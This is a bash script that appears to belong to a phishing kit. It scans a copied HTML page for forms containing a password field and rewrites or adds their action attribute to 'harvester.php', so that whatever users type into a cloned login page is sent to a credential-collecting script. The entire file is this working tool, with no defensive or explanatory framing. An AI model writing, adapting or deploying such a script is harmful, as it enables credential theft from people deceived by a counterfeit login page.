#!/bin/bash

# Automatically detect the only HTML file in the folder
input=$(find . -maxdepth 1 -type f -iname "*.html" | head -n 1)
output="index.html"
tmp_form="/tmp/form_block.txt"

# Clear or create output file
> "$output"

inside_form=0
buffer=""

while IFS= read -r line; do
  if [[ $inside_form -eq 0 && $line == *"<form"* ]]; then
    inside_form=1
    buffer="$line"$'\n'
    continue
  fi

  if [[ $inside_form -eq 1 ]]; then
    buffer+="$line"$'\n'
    if [[ $line == *"</form>"* ]]; then
      inside_form=0
      echo "$buffer" > "$tmp_form"

      if grep -qiE 'type=["'\'']?password["'\'']?' "$tmp_form"; then
        if grep -qi 'action=' "$tmp_form"; then
          # Replace existing action
          modified_form=$(echo "$buffer" | sed '0,/<form[^>]*action=[^ >]*/{s/action="[^"]*"/action="harvester.php"/}')
        else
          # Inject action if missing
          modified_form=$(echo "$buffer" | sed '0,/<form/{s/<form/<form action="harvester.php"/}')
        fi
        echo "$modified_form" >> "$output"
      else
        echo "$buffer" >> "$output"
      fi
      buffer=""
    fi
    continue
  fi

  echo "$line" >> "$output"
done < "$input"
